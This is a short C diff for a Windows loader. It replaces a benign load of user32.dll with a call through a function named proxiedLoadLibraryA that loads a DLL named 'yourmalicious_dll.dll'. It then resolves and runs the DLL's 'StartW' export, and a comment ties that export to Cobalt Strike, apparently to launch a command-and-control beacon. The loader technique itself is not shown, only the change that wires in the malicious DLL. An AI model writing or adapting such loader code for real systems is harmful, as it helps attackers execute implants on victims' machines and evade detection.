@@ -129,6 +129,23 @@ HMODULE proxiedLoadLibraryA(LPCSTR libName) {
 }
 
 int main() {
-    HMODULE user32 = proxiedLoadLibraryA("user32.dll");
-    printf("user32.dll Address: %p\n", user32);
+    //modify path
+    HMODULE hModulus = proxiedLoadLibraryA("C:\\Users\\admin\\source\\repos\\ConsoleApplication4\\x64\\Debug\\yourmalicious_dll.dll");
+    if (hModulus == NULL) {
+        // Handle the error
+    }
+    typedef void (*MyFunctionType)(void);
+
+    // Get a pointer to the function. //also support different DLLMain (in this case CS uses StartW) 
+    MyFunctionType myFunction = (MyFunctionType)GetProcAddress(hModulus, "StartW");
+    if (myFunction == NULL) {
+        // Handle the error
+    }
+    if (myFunction != NULL) {
+        myFunction(); // Call the function
+    }
+		
+   // printf("user32.dll Address: %p\n", user32);
+    printf("yourmalicious_dll.dll Address: %p\n", hModulus);
+
 }
